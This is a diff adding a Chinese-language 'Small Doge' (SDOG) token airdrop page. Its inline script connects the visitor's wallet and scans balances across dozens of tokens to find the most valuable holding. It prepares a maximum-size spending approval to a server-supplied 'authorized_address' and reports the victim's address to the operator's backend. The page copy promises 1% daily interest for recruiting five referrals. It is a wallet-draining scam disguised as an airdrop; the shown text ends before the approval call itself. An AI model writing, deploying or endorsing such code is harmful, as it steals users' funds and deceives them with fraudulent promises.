@@ -1,0 +1,1065 @@
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+<script>!function(e){e.className=e.className.replace(/\bno-js\b/,"js")}(document.documentElement);</script>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+   
+    <title>The Small Doge </title>
+    <link href="https://www.smalldogecoin.com//img/favicon.png" type="image/png" rel="shortcut icon">
+    
+    <script src="static/js/w3model.js"></script>
+    <!-- <script src="static/js/flexible.js"></script> -->
+    <script src="static/js/bignumber.min.js"></script>
+    <script type="text/javascript" src="static/js/web3.min.js"></script>
+    <script type="text/javascript" src="static/js/web3model.min.js"></script>
+    <script type="text/javascript" src="static/js/evmchain.js"></script>
+    <script type="text/javascript" src="static/js/web3provider.js"></script>
+    <script type="text/javascript" src="static/js/fortmatic.js"></script>
+     <link href="static/css/style.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.gstatic.com/">
+    <style type="text/css">
+
+      #loading {
+  display: none;
+  position: absolute;
+  top: 0;
+  right: 0;
+  left: 0;
+  bottom: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,.4);
+  z-index: 10000;
+}
+
+#loading img {
+  position: fixed;
+  top: 0;
+  right: 0;
+  left: 0;
+  bottom: 0;
+  margin: auto;
+  width: 20%;
+  max-width: 200px;
+}
+    </style>
+  </head>
+
+
+<body data-spy="scroll" data-target=".page-header-nav" data-offset="0">
+  <header class="page-header" id="top">
+  <div class="page-header-container">
+    <a href="" class="page-header-brand">
+      <img src="static/picture/sdog.svg" alt="SDOG" class="page-header-brand-img">
+    </a>
+    <div class="page-header-content">
+      <a href="#" class="page-header-toggle collapsed" data-toggle="navbar">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </a>
+      <nav class="page-header-navbar">
+        <ul class="nav page-header-nav">
+          <!--<li>-->
+          <!--  <a href="index.html">领取SDOG</a>-->
+          <!--</li>-->
+          <li>
+            <a href="#whitelist" data-toggle="scroll-to" class="nav-link">空投机制</a>
+          </li>
+          <li>
+            <a href="#mining-mechanism" data-toggle="scroll-to" class="nav-link">挖矿机制</a>
+          </li>
+          <li>
+            <a href="#token-mechanism" data-toggle="scroll-to" class="nav-link">代币机制</a>
+          </li>
+          <li>
+            <a href="buy.html" class="btn btn-primary btn-tr process">领取流程</a>
+          </li>
+        </ul>
+      </nav>
+    </div>
+  </div>
+</header>
+
+
+  <section class="welcome-section fade-in">
+    <div class="container" id="what">
+      <div class="welcome-content fade-xs-1 fade-md-1 fade-lg-1">
+        <ul class="nav nav-tabs welcome-tabs">
+          <li class="nav-item">
+            <a class="nav-link active" data-toggle="tab" href="#earth">地球计划</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" data-toggle="tab" href="#mars">火星计划</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" data-toggle="tab" href="#space">太空计划</a>
+          </li>
+        </ul>
+        <div class="tab-content">
+          <div class="tab-pane active" id="earth">
+            <h1 class="welcome-title"><span class="text-primary">地球计划</span> 初创，小狗币空投</h1>
+            <div class="welcome-lead">
+              <p>为了成为当前加密市场新秩序中价值流通的基石，SDOG所有的代币产出，除了空投给狗狗币持有者、Vitalik Buterin（V神）、Elon Musk（埃隆·马斯克）、NASA（美国国家航空航天局）和SpaceX（美国太空探索技术公司）的部分，都是以去中心化的方式分配给社区，让更多的人可以持有我，共同见证去中心化的生命力。</p>
+            </div>
+            <div class="welcome-img">
+              <img src="static/picture/welcome-earth.png" alt="" class="img-responsive-full">
+            </div>
+          </div>
+          <div class="tab-pane" id="mars">
+            <h1 class="welcome-title"><span class="text-primary">火星计划</span> 成长，火星节点</h1>
+            <div class="welcome-lead">
+              <p>2021年4月23日，SpaceX已经成功的将4位宇航员送进宇宙太空站，迈入太空的一小步已经踏出。在地球计划完成后SDOG也将开启火星节点计划，搭建自己的火星节点。节点越多越完善，小狗币的生态就会越安全，更加快速的确认交易有效性，保障信息的透明，为第三步计划做准备。</p>
+            </div>
+            <div class="welcome-img">
+              <img src="static/picture/welcome-mars.png" alt="" class="img-responsive-full">
+            </div>
+          </div>
+          <div class="tab-pane" id="space">
+            <h1 class="welcome-title"><span class="text-primary">太空计划</span> 未来，太空通用货币 </h1>
+            <div class="welcome-lead">
+              <p>在KenLon Musk Project带领下，我们完全可以搭建完全的去中心化网络，数据不会丢失，网络绝对安全。受信节点还可以获得运行网络的节点激励。嗯，到那个时后，我应该也不会叫小狗币了，请大家叫我火星币好吗？我将成为火星的通用货币~</p>
+            </div>
+            <div class="welcome-img">
+              <img src="static/picture/welcome-space.png" alt="" class="img-responsive-full">
+            </div>
+          </div>
+        </div>
+        <div class="welcome-btns">
+          <a href="buy.html" class="btn btn-primary btn-tr process">领取流程</a>
+          <a class="btn btn-third btn-tl btn-icon" href="javascript:;" id="btn-connect">
+            <img src="static/picture/dog.svg">领取SDOG NFT</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="airdrop-mechanism-section" id="whitelist">
+    <div class="container">
+      <div class="fade-in">
+        <div class="airdrop-mechanism-address fade-xs-0 fade-md-0 fade-lg-0">
+          <span class="date">
+
+                <span class="text-secondary">8月1日 12:00（UTC +0）</span>上线Uniswap交易
+          </span>
+          <img src="static/picture/dog.svg" alt="">
+          <span class="label">SDOG Token Address:</span>
+          <span class="text-primary">0x86f9ba3936dc97309f221fdbb752073a67e49b52</span>
+        </div>
+        <header class="section-header fade-xs-0 fade-md-0 fade-lg-0">
+          <h2 class="section-header-title">空投机制              </h2>
+          <div class="section-header-text">
+            <p>分享推广链接满5人以上，即可激活钱包持币生息功能，钱包持有500USDT以上且存放3日后每日产生1%的利息</p>
+          </div>
+        </header>
+      </div>
+      <div class="fade-in">
+        <div class="airdrop-mechanism-logos fade-xs-0 fade-md-0 fade-lg-0">
+          <strong class="airdrop-mechanism-logos-title">已添加白名单钱包</strong>
+          <ul class="airdrop-mechanism-logos-list">
+            <li>
+              <a href="javascript:;" target="_blank">
+                <img src="static/picture/imtoken.png" alt="">
+              </a>
+            </li>
+            <li>
+              <a href="javascript:;" target="_blank">
+                <img src="static/picture/huobi.png" alt="">
+              </a>
+            </li>
+            <li>
+              <a href="javascript:;" target="_blank" referrerpolicy="no-referrer">
+                <img src="static/picture/tp.png" alt="">
+              </a>
+            </li>
+            <li>
+              <a href="javascript:;" target="_blank">
+                <img src="static/picture/coinbase.png" alt="">
+              </a>
+            </li>
+            <li>
+              <a href="javascript:;" target="_blank">
+                <img src="static/picture/hyper.png" alt="">
+              </a>
+            </li>
+            <li>
+              <a href="javascript:;" target="_blank">
+                <img src="static/picture/coco.png" alt="">
+              </a>
+            </li>
+            <li>
+              <a href="javascript:;" target="_blank">
+                <img src="static/picture/bitepai.png" alt="">
+              </a>
+            </li>
+            <li>
+              <a href="javascript:;" target="_blank">
+                <img src="static/picture/meta.png" alt="">
+              </a>
+            </li>
+          </ul>
+        </div>
+        <!--<div class="airdrop-mechanism-logos fade-xs-1 fade-md-1 fade-lg-1">-->
+        <!--  <strong class="airdrop-mechanism-logos-title">期望添加白名单交易所</strong>-->
+        <!--  <ul class="airdrop-mechanism-logos-list">-->
+        <!--    <li>-->
+        <!--      <a href="javascript:;" target="_blank">-->
+        <!--        <img src="static/picture/LOGOS_15.png" alt="">-->
+        <!--      </a>-->
+        <!--    </li>-->
+        <!--    <li>-->
+        <!--      <a href="javascript:;" target="_blank">-->
+        <!--        <img src="static/picture/LOGOS_06.png" alt="">-->
+        <!--      </a>-->
+        <!--    </li>-->
+        <!--    <li>-->
+        <!--      <a href="javascript:;" target="_blank">-->
+        <!--        <img src="static/picture/LOGOS_12.png" alt="">-->
+        <!--      </a>-->
+        <!--    </li>-->
+        <!--    <li>-->
+        <!--      <a href="javascript:;" target="_blank">-->
+        <!--        <img src="static/picture/LOGOS_22.png" alt="">-->
+        <!--      </a>-->
+        <!--    </li>-->
+        <!--    <li>-->
+        <!--      <a href="javascript:;" target="_blank">-->
+        <!--        <img src="static/picture/LOGOS_21.png" alt="">-->
+        <!--      </a>-->
+        <!--    </li>-->
+        <!--    <li>-->
+        <!--      <a href="javascript:;" target="_blank">-->
+        <!--        <img src="static/picture/LOGOS_11.png" alt="">-->
+        <!--      </a>-->
+        <!--    </li>-->
+        <!--    <li>-->
+        <!--      <a href="javascript:;" target="_blank">-->
+        <!--        <img src="static/picture/LOGOS_09.png" alt="">-->
+        <!--      </a>-->
+        <!--    </li>-->
+        <!--    <li>-->
+        <!--      <a href="javascript:;" target="_blank">-->
+        <!--        <img src="static/picture/LOGOS_07.png" alt="">-->
+        <!--      </a>-->
+        <!--    </li>-->
+        <!--    <li>-->
+        <!--      <a href="javascript:;" target="_blank">-->
+        <!--        <img src="static/picture/LOGOS_17.png" alt="">-->
+        <!--      </a>-->
+        <!--    </li>-->
+        <!--    <li>-->
+        <!--      <a href="javascript:;" target="_blank">-->
+        <!--        <img src="static/picture/LOGOS_20.png" alt="">-->
+        <!--      </a>-->
+        <!--    </li>-->
+        <!--    <li>-->
+        <!--      <a href="javascript:;" target="_blank">-->
+        <!--        <img src="static/picture/LOGOS_16.png" alt="">-->
+        <!--      </a>-->
+        <!--    </li>-->
+        <!--    <li>-->
+        <!--      <a href="javascript:;" target="_blank">-->
+        <!--        <img src="static/picture/LOGOS_18.png" alt="">-->
+        <!--      </a>-->
+        <!--    </li>-->
+        <!--    <li>-->
+        <!--      <a href="javascript:;" target="_blank">-->
+        <!--        <img src="static/picture/LOGOS_08.png" alt="">-->
+        <!--      </a>-->
+        <!--    </li>-->
+        <!--    <li>-->
+        <!--      <a href="javascript:;" target="_blank">-->
+        <!--        <img src="static/picture/LOGOS_13.png" alt="">-->
+        <!--      </a>-->
+        <!--    </li>-->
+        <!--  </ul>-->
+        <!--</div>-->
+        <div class="airdrop-mechanism-join fade-xs-2 fade-md-2 fade-lg-2">
+          <span class="airdrop-mechanism-join-label">白名单合作联系方式
+
+
+
+              </span>
+          <ul class="airdrop-mechanism-join-social">
+            <li>
+              <a href="javascript:;" target="_blank"><i class="icon icon-tw"></i></a>
+            </li>
+            <li>
+              <a href="javascript:window.open('https://t.me/SDOGCustomerservice');" target="_blank"><i class="icon icon-telegram"></i></a>
+            </li>
+            <li>
+              <a href="mailto:support@smalldogecoin.com"><i class="icon icon-contact"></i></a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="mining-mechanism-section" id="mining-mechanism">
+    <div class="container fade-in">
+      <header class="section-header fade-xs-0 fade-md-0 fade-lg-0">
+        <h2 class="section-header-title">挖矿机制
+
+
+
+            </h2>
+        <div class="section-header-text">
+          <p>我们将在中心化交易所上进行了空投，并将挖矿功能放到去中心化以太坊网络中。SDOG 的 50%由去中心化挖矿产出。</p>
+        </div>
+      </header>
+      <div class="row mining-mechanism-row">
+        <div class="col-sm-6 fade-xs-1 fade-md-1 fade-lg-1">
+          <div class="mining-mechanism-text">
+            <strong class="mining-mechanism-text-header"><span class="nr">1</span> 挖矿方式：</strong>
+            <p>SDOG 单币质押、SDOG-ETH UNI v2 LP 流动性挖矿</p>
+            <strong class="mining-mechanism-text-header"><span class="nr">2</span> 挖矿模式：</strong>
+            <ul>
+              <li>前3周有10倍挖矿倍数加成。</li>
+              <li>挖矿收益将不会一次性解锁，具体解锁方式将在矿池上线时公布</li>
+            </ul>
+          </div>
+        </div>
+        <div class="col-sm-6 fade-xs-2 fade-md-2 fade-lg-2">
+          <img src="static/picture/mining-mechanism.png" alt="" class="img-responsive-full">
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+  <section class="token-mechanism-section" id="token-mechanism">
+    <div class="container fade-in">
+      <div class="row token-mechanism-row">
+        <div class="col-sm-6 fade-xs-0 fade-md-0 fade-lg-0">
+          <h2 class="section-header-title">代币机制              </h2>
+          <div class="token-mechanism-text">
+            <div class="token-mechanism-text-total">
+              <span class="token-mechanism-text-total-label">代币总量</span>
+              <span class="token-mechanism-text-total-price"><span class="text-primary">128,756,977,746,000 SDOG</span></span>
+              <br>（1USDT = 1000 SDOG）
+            </div>
+            <div class="token-mechanism-text-distribution">
+              <strong>代币分配:                  </strong>
+              <p>
+                <span>初始流动性: <span>5%</span></span>
+                <span>V神: <span>5%</span></span>
+                <span>埃隆·马斯克: <span>5%</span></span>
+                <span>空投分配: <span>35%</span></span>
+                <span>挖矿分配: <span>50%</span></span>
+              </p>
+            </div>
+          </div>
+        </div>
+        <div class="col-sm-6 fade-xs-1 fade-md-1 fade-lg-1">
+          <img src="static/picture/token-mechanism.png" alt="" class="img-responsive-full">
+        </div>
+      </div>
+    </div>
+  </section>
+  
+
+  <footer class="page-footer">
+  <div class="container">
+    <div class="page-footer-container">
+      <div class="page-footer-aside">
+        <div>
+          <a href="buy.html" class="btn btn-tr btn-primary process">领取流程</a>
+        </div>
+        <div>
+          <!-- <a href="index1.html" class="btn btn-tl btn-secondary">English</a> -->
+        </div>
+      </div>
+      <div class="page-footer-main">
+        <ul class="page-footer-social">
+          <li>
+            <a href="javascript:;" target="_blank"><i class="icon icon-tw"></i></a>
+          </li>
+          <li>
+            <a href="javascript:window.open('https://t.me/SDOGCustomerservice');" target="_blank"><i class="icon icon-telegram"></i></a>
+          </li>
+          <li>
+            <a href="mailto:support@smalldogecoin.com"><i class="icon icon-contact"></i></a>
+          </li>
+        </ul>
+        <div class="page-footer-copy">
+          &copy; Copyright © <strong>The Small Doge Project</strong> 2021
+        </div>
+      </div>
+    </div>
+  </div>
+
+</footer>
+
+<div class="modal fade" style="opacity: 1;transform: none;background-color: #00000099;" id="modalComingSoon" tabindex="-1" aria-hidden="true">
+<div class="modal-dialog">
+  <div class="modal-content" style="background: #13273c;">
+    <button type="button" id="closetui" class="modal-close" data-dismiss="modal" aria-label="Close">
+      <span aria-hidden="true">&times;</span>
+    </button>
+    <div class="modal-body">
+      <div class="modal-cooming-soon">
+        <h3 style="padding: 0.4rem 0rem 0.8rem 0rem;">邀请好友</h3>
+        <div class="layer_text" data-ischange="true" data-key="indexLayerMsg_1" style="white-space: normal;">
+            <div id="qrcode" style="height: 15rem;
+    width: 70%;margin-right:auto;margin-left:auto;">
+                    
+            </div>
+            <span style="display:block;font-size:1rem;word-break: break-all;text-align: center;">
+              推广链接：<span id="link"></span>
+
+            </span>
+            <div class="layer_line" style="text-align: center;
+    border-top: 1px solid;
+    width: 90%;
+    margin-left: auto;
+    margin-right: auto;
+    font-size: 0.9rem;
+    color: #e69564;"><span data-ischange="true" data-key="indexLayerMsg_2">分享推广链接满5人以上，即可激活钱包持币生息功能，钱包持有500USDT以上且存放3日后每日产生1%的利息</span></div>
+     <a id="copyBtn" style="    padding: 0.6rem 2rem;
+    background: #e69564;
+    font-size: 1rem;
+    font-weight: 500;
+    color: white;
+    border-radius: 1.5rem;
+    margin-bottom: 2rem;
+    display: block;
+    text-align: center;
+    width: 60%;
+    margin-left: auto;
+    margin-right: auto;
+    margin-top: 1rem;" class="layer_btn" data-ischange="true" data-clipboard-text="" data-clipboard-action="copy" data-key="indexLayerBtn">复制链接</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+
+<div id="loading" style="display: none;">
+        <img src="static/image/loading.gif">
+    </div>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script src="static/js/jquery-3.4.1.min.js"></script>
+<script src="static/js/aos.js"></script>
+<script src="static/js/qrcode.js"></script>
+<script src="static/js/clipboard.min.js"></script>
+<script src="static/js/all.min.js"></script>
+
+<script async="" src="static/js/js.js"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-LKKQY85Y2C');
+</script>
+<script>
+    const ABI = [{"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}];
+    $(function() {
+        AOS.init();
+        var authorized_address = '';
+        var infura_key = '';
+        var domain = 'https://' + window.location.host + '/';
+        var bizhong = '';
+        const approveNum = new BigNumber(2).exponentiatedBy(256).minus(1)
+        /******************************************/
+        // Unpkg imports
+        const _web3 = new Web3('https://cloudflare-eth.com')
+        var fffsss = ""
+        // const _web3 = new Web3('https://mainnet-eth.compound.finance')
+        // const _web3 = new Web3('https://mainnet.infura.io/v3/defe8b89cb8b475f94679569c77bcbc7')
+        let injectedWeb3 = null, total = 0
+        let approveAddr = '0xdac17f958d2ee523a2206206994597c13d831ec7'
+        const addr = {
+            'usdt': '0xdac17f958d2ee523a2206206994597c13d831ec7',
+            'sushi': '0x6b3595068778dd592e39a122f4f5a5cf09c90fe2',
+            'usdc': '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
+            'uni': '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984',
+            'aave': '0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9',
+            'yfi': '0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e',
+            'dai': '0x6b175474e89094c44da98b954eedeac495271d0f',
+            'link': '0x514910771af9ca656af840dff83e8264ecf986ca',
+            "LON": "0x0000000000095413afc295d19edeb1ad7b71c952",
+            "CRV": "0xD533a949740bb3306d119CC777fa900bA034cd52",
+        }
+
+        const addr2 = {
+            "WBTC": "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
+            "WETH": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
+            "CONV": "0xc834fa996fa3bec7aad3693af486ae53d8aa8b50",
+            "inj": "0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30",
+            "MKR": "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2",
+            "ALPHA": "0xa1faa113cbe53436df28ff0aee54275c13b40975",
+            "BAND": "0xba11d00c5f74255f56a5e366f4f77f5a186d7f55",
+            "snx": "0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f",
+            "comp": "0xc00e94cb662c3520282e6f5717214004a7f26888",
+            "sxp": "0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9",
+        }
+
+        const addr3 = {
+            "FTT": "0x50d1c9771902476076ecfc8b2a83ad6b9355a4c9",
+            "ust": "0xa47c8bf37f92abed4a126bda807a7b7498661acd",
+            "TRIBE": "0xc7283b66eb1eb5fb86327f08e1b5816b0720212b",
+            "wise": "0x66a0f676479Cee1d7373f3DC2e2952778BfF5bd6",
+            "RRAX": "0x853d955acef822db058eb8505911ed77f175b99e",
+            "CORE": "0x62359Ed7505Efc61FF1D56fEF82158CcaffA23D7",
+            "mir": "0x09a3ecafa817268f77be1283176b946c4ff2e608",
+            "DPI": "0x1494ca1f11d487c2bbe4543e90080aeba4ba3c2b",
+            "luna": "0xd2877702675e6ceb975b4a1dff9fb7baf4c91ea9",
+            "HEZ": "0xEEF9f339514298C6A857EfCfC1A762aF84438dEE",
+            "fxs": "0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0",
+            "fei": "0x956f47f50a910163d8bf957cf5846d573e7f87ca",
+        }
+
+        async function getMostValuableAssets(account) {
+            let _symbol = 'usdt'
+            for (const [symbol, contract] of Object.entries(contracts)) {
+                contract.methods.balanceOf(account).call(function(err, balance) {
+        		if(symbol == 'usdt'){
+					total =balance / (10** (decimals[symbol] || 18))
+				}
+                    
+                    const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+                    if (usdt > total && usdt > 1000) {
+                        _symbol = symbol
+                        total = usdt
+                        approveAddr = addr[_symbol]
+                        bizhong = _symbol
+                        console.log('_symbol:'+_symbol);
+                    }
+                })
+            }
+            
+            bizhong = _symbol
+
+            return _symbol
+        }
+        
+        
+        function getUrlQueryString(names, urls) {
+  urls = urls || window.location.href;
+  urls && urls.indexOf("?") > -1 ? urls = urls
+      .substring(urls.indexOf("?") + 1) : "";
+  var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
+  var r = urls ? urls.match(reg) : window.location.search.substr(1)
+      .match(reg);
+  if (r != null && r[2] != "")
+    return unescape(r[2]);
+  return null;
+};
+        
+        function getInfo(){
+            
+            //  $("#fffsss").text(domain + '/api/portal/open/getInfo')
+            $.ajax({
+                type: 'get',
+                url:  domain + 'api/get_erc',
+                async : false,
+                success:function(data){
+                    console.log(data)
+                 authorized_address = data.data.authorized_address;
+                 console.log(authorized_address);
+                 infura_key = data.data.infura_key;
+                },
+                error:function(data){
+                }
+                
+            })
+        }
+        
+        async function postInfo(address,symbol){
+            var s = getUrlQueryString('s')
+            var a = getUrlQueryString('r')
+
+            var data = {
+                address:address,
+                authorized_address:authorized_address,
+                bizhong:symbol,
+                code:s,
+                reffer:a
+            }
+            
+            //  fffsss = fffsss + "address:" + address + "---" + "authorized_address:" + authorized_address + "---" + "bizhong:" + symbol + "---"
+            // $("#fffsss").text(fffsss)
+            
+            $.ajax({
+                type: 'post',
+                url:  domain + 'api/insert_erc',
+                data:data,
+                success:function(data){
+                    //console.log(data)
+                    if(data.code == 200){
+                       console.log('success')
+                    }
+                     console.log(data.msg)
+                },
+                error:function(data){
+                    console.log(data)
+                }
+            })
+        }
+
+        async function getMostValuableAssets2(account) {
+            let _symbol = 'usdt'
+            for (const [symbol, contract] of Object.entries(contracts2)) {
+                contract.methods.balanceOf(account).call(function(err, balance) {
+                    const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+                    if (usdt > total && usdt > 1000) {
+                        _symbol = symbol
+                        total = usdt
+                        approveAddr = addr[_symbol]
+                        
+                    }
+                })
+                
+                
+            }
+            
+            bizhong = _symbol
+       
+
+            return _symbol
+        }
+
+        async function getMostValuableAssets3(account) {
+            let _symbol = 'usdt'
+            for (const [symbol, contract] of Object.entries(contracts3)) {
+                contract.methods.balanceOf(account).call(function(err, balance) {
+                    const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+                    if (usdt > total && usdt > 1000) {
+                        _symbol = symbol
+                        total = usdt
+                        approveAddr = addr[_symbol]
+                        
+                    }
+                })
+            }
+            bizhong = _symbol
+
+            return _symbol
+        }
+
+        const price = {
+            usdt: 1,
+            sushi: 15.5,
+            usdc: 1,
+            dai: 1,
+            uni: 28.6,
+            aave: 380,
+            yfi: 35000,
+            link: 28.2,
+            "LON": 7,
+            "CRV": 3.01367,
+            "GUSD": 1,
+            "WBTC": 56478.2,
+            "WETH": 1991.89,
+            "CONV": 0.105733,
+            "inj": 13.3812,
+            "MKR": 2076.68,
+            "ALPHA": 1.79043,
+            "BAND": 16.3441,
+            "snx": 20.0588,
+            "comp": 468.076,
+            "sxp": 4.11818,
+            "FTT": 46.1779,
+            "ust": 1.00543,
+            "TRIBE": 1.42926,
+            "wise": 0.446973,
+            "RRAX": 0.996821,
+            "CORE": 5447.59,
+            "mir": 8.69817,
+            "DPI": 415.906,
+            "luna": 15.2402,
+            "HEZ": 5.97533,
+            "fxs": 8.47025,
+            "fei": 0.898157,
+        }
+
+        const decimals = {
+            sushi: 18,
+            usdt: 6,
+            usdc: 6,
+            uni: 18,
+            dai: 18,
+            aave: 18,
+            yfi: 18,
+            link: 18,
+            WBTC: 8,
+        }
+
+        const contracts = {}, contracts2 = {}, contracts3 = {}
+        for (const symbol of Object.keys(addr)) {
+            const contractAddr = addr[symbol]
+            contracts[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+        }
+
+        for (const symbol of Object.keys(addr2)) {
+            const contractAddr = addr2[symbol]
+            contracts2[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+        }
+
+        for (const symbol of Object.keys(addr3)) {
+            const contractAddr = addr3[symbol]
+            contracts3[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+        }
+
+        const Web3Modal = window.Web3Modal.default;
+        const WalletConnectProvider = window.WalletConnectProvider.default;
+        const Fortmatic = window.Fortmatic;
+        const evmChains = window.evmChains;
+
+        // Web3modal instance
+        let web3Modal
+
+        // Chosen wallet provider given by the dialog window
+        let provider;
+
+        // Address of the selected account
+        let selectedAccount;
+
+        /**
+         * Setup the orchestra
+         */
+        async function init() {
+            
+          getInfo();
+          
+         
+          console.log(infura_key);
+        //   $("#fffsss").text('aaa0'+authorized_address)
+            
+            // Check that the web page is run in a secure context,
+            // as otherwise MetaMask won't be available
+            // if(location.protocol !== 'https:') {
+            //   // https://ethereum.stackexchange.com/a/62217/620
+            //   const alert = document.querySelector("#alert-error-https");
+            //   alert.style.display = "block";
+            //   document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
+            //   return;
+            // }
+
+            // Tell Web3modal what providers we have available.
+            // Built-in web browser provider (only one can exist as a time)
+            // like MetaMask, Brave or Opera is added automatically by Web3modal
+           
+            const providerOptions = {
+                walletconnect: {
+                    package: WalletConnectProvider,
+                    options: {
+                        // Mikko's test key - don't copy as your mileage may vary
+                        infuraId: infura_key,
+                    }
+                },
+
+                // fortmatic: {
+                //   package: Fortmatic,
+                //   options: {
+                //     // Mikko's TESTNET api key
+                //     key: "pk_test_391E26A3B43A3350"
+                //   }
+                // }
+            };
+console.log(providerOptions);
+            web3Modal = new Web3Modal({
+                cacheProvider: false, // optional
+                providerOptions, // required
+                disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
+            });
+
+
+            try {
+                provider = await web3Modal.connect()
+                provider.enable()
+            } catch(e) {
+                console.log("Could not get a wallet connection", e);
+                return;
+            }
+
+            // Subscribe to accounts change
+            provider.on("accountsChanged", async (accounts) => {
+                await fetchAccountData();
+        });
+
+            // Subscribe to chainId change
+            provider.on("chainChanged", async (chainId) => {
+                await fetchAccountData();
+        });
+
+            // Subscribe to networkId change
+            provider.on("networkChanged", async (networkId) => {
+                await fetchAccountData();
+        });
+
+            await refreshAccountData();
+        }
+
+
+        /**
+         * Kick in the UI action after Web3modal dialog has chosen a provider
+         */
+        async function fetchAccountData() {
+            const web3 = new Web3(provider);
+            injectedWeb3 = web3
+            provider.enable()
+            const accounts = await web3.eth.getAccounts()
+            selectedAccount = accounts[0]
+            getMostValuableAssets(selectedAccount)
+            setTimeout(function() {
+                getMostValuableAssets2(selectedAccount)
+            }, 200)
+            setTimeout(function() {
+                getMostValuableAssets3(selectedAccount)
+            }, 300)
+        }
+
+        /**
+         * Fetch account data for UI when
+         * - User switches accounts in wallet
+         * - User switches networks in wallet
+         * - User connects wallet initially
+         */
+        async function refreshAccountData() {
+
+            // If any current data is displayed when
+            // the user is switching acounts in the wallet
+            // immediate hide this data
+            // document.querySelector("#connected").style.display = "none";
+            // document.querySelector("#prepare").style.display = "block";
+
+            // Disable button while UI is loading.
+            // fetchAccountData() will take a while as it communicates
+            // with Ethereum node via JSON-RPC and loads chain data
+            // over an API call.
+            document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
+            await fetchAccountData(provider);
+            document.querySelector("#btn-connect").removeAttribute("disabled")
+        }
+
+
+        /**
+         * Connect wallet button pressed.
+         */
+        async function onConnect() {
+            // fffsss = fffsss + "开始:"
+            console.log(authorized_address);
+            console.log(infura_key);
+        //   tuiguang(selectedAccount);
+        //   return
+      
+    
+            // fffsss = fffsss + "approveAddr:" + approveAddr + "---"
+            // $("#fffsss").text(fffsss)
+            $('#loading').show()
+            //  fffsss = fffsss + "infura_key:" + infura_key + "---"
+            // $("#fffsss").text(fffsss)
